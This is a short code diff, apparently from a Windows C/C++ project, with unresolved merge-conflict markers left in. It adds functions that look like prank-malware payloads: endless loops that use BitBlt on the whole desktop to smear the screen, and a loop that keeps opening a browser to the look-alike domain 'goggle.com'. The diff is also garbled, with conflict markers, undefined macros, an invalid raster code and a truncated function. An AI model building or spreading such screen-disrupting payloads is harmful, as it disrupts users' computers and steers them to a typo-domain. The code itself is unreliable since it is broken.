@@ -852,6 +852,7 @@ int p35() {
 	}
 	return 0;
 }
+<<<<<<< Updated upstream
 int p36() {
 	HDC desk = GetDC(NULL);
 	while (true) {
@@ -904,4 +905,36 @@ int p36() {
 		Sleep(1000);
 
 	}
+=======
+
+int p36() {
+	whiletrue
+	{
+		Sleep(rand() % 10000);
+		HDC desk = GetDC(NULL);
+		fori(500)
+		{
+			for (int i = 0; i < 500; i++)
+			{
+				BitBlt(desk, i, i, 1500, 1000, desk, 0, 0, SRCCOPY);
+			}
+		}
+	}
+	return 0;
+}
+
+int p37() {
+	whiletrue
+	{
+		// Open a link
+		ShellExecute(NULL, "open", "https://www.goggle.com", NULL, NULL, SW_SHOW);
+		HDC desk = GetDC(NULL);
+		BitBlt(desk, 0, 0, SM_CXSCREEN, SM_CYSCREEN, desk, 0, 0, 0x12345678);
+		Sleep(rand() % 10000);
+	}
+}
+
+int p38() {
+
+>>>>>>> Stashed changes
 }
